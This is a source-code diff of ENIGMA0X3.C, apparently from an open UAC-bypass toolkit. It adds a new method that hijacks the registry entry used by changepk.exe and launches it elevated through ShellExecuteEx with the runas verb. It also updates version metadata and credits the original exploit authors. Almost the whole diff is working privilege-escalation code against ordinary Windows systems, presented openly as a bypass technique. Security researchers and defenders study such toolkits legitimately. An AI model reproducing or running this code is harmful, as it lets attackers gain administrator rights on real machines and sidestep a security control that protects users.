@@ -4,9 +4,9 @@
 *
 *  TITLE:       ENIGMA0X3.C
 *
-*  VERSION:     3.24
+*  VERSION:     3.25
 *
-*  DATE:        20 Apr 2020
+*  DATE:        05 May 2020
 *
 *  Enigma0x3 autoelevation methods and everything based on the same
 *  ShellExecute related registry manipulations idea.
@@ -21,6 +21,7 @@
 *  https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/
 *  http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass
 *  https://www.activecyber.us/1/post/2019/03/windows-uac-bypass.html
+*  https://packetstormsecurity.com/files/155927/Microsoft-Windows-10-Local-Privilege-Escalation.html
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
 * ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
@@ -675,16 +676,19 @@ NTSTATUS ucmMsSettingsDelegateExecuteMethod(
 *
 * Purpose:
 *
-* Bypass UAC abusing COM entry hijack.
+* Bypass UAC abusing registry entry hijack.
 * Original authors links: http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass
 *                         https://www.activecyber.us/1/post/2019/03/windows-uac-bypass.html
+*                         https://packetstormsecurity.com/files/155927/Microsoft-Windows-10-Local-Privilege-Escalation.html
 *
 * Targets:
 *            sdclt.exe without params for Emeric Nasi method
 *            WSReset.exe without params for Hashim Jawad method
+*            changepk.exe without params for Nassim Asrir method
 *
 */
 NTSTATUS ucmShellDelegateExecuteCommandMethod(
+    _In_ UCM_METHOD Method,
     _In_ LPWSTR lpTargetApp,
     _In_ SIZE_T cchTargetApp, //in chars, future use
     _In_ LPWSTR lpTargetKey,
@@ -710,6 +714,9 @@ NTSTATUS ucmShellDelegateExecuteCommandMethod(
     WCHAR szBuffer[MAX_PATH * 2];
     WCHAR szOldValue[MAX_PATH + 1];
     WCHAR szOldDelegateExecute[MAX_PATH + 1];
+
+    SHELLEXECUTEINFO shinfo;
+
 
 #ifndef _WIN64
     if (g_ctx->IsWow64) {
@@ -828,11 +835,37 @@ NTSTATUS ucmShellDelegateExecuteCommandMethod(
 
             _strcpy(szBuffer, g_ctx->szSystemDirectory);
             _strcat(szBuffer, lpTargetApp);
-            if (supRunProcess2(szBuffer, NULL, NULL, SW_HIDE, TRUE))
-                MethodResult = STATUS_SUCCESS;
 
-            Sleep(5000);  //wait a bit until this shell shit complete it internals
-                          //not required if you don't cleanup or use reg.exe
+            //
+            // Use forced elevation from slui.exe as launcher.
+            //
+            if (Method == UacMethodShellChangePk) {
+
+                RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
+                shinfo.cbSize = sizeof(shinfo);
+                shinfo.lpVerb = RUNAS_VERB;
+                shinfo.lpFile = szBuffer;
+                shinfo.nShow = SW_SHOWNORMAL;
+                shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
+                if (ShellExecuteEx(&shinfo)) {
+                    Sleep(5000);
+                    TerminateProcess(shinfo.hProcess, 0);
+                    CloseHandle(shinfo.hProcess);
+                    MethodResult = STATUS_SUCCESS;
+                }
+            }
+            else {
+                //
+                // Run target application as usual.
+                //
+                if (supRunProcess2(szBuffer, NULL, NULL, SW_HIDE, TRUE))
+                    MethodResult = STATUS_SUCCESS;
+
+                Sleep(5000);  //wait a bit until this shell shit complete it internals
+                         //not required if you don't cleanup or use reg.exe
+            }
+
+
 
             if (bExist == FALSE) {
                 //
@@ -900,7 +933,6 @@ NTSTATUS ucmShellDelegateExecuteCommandMethod(
     if (dwDisposition == REG_CREATED_NEW_KEY) {
         supRegDeleteKeyRecursive(HKEY_CURRENT_USER, lpTargetKey);
     }
-
 
 #ifndef _WIN64
     if (g_ctx->IsWow64) {
@@ -1004,6 +1036,5 @@ NTSTATUS ucmGluptebaMethod(
         supRegDeleteKeyRecursive(HKEY_CURRENT_USER, T_MSC_SHELL);
     }
 
-    SetEvent(g_ctx->SharedContext.hCompletionEvent);
     return MethodResult;
 }
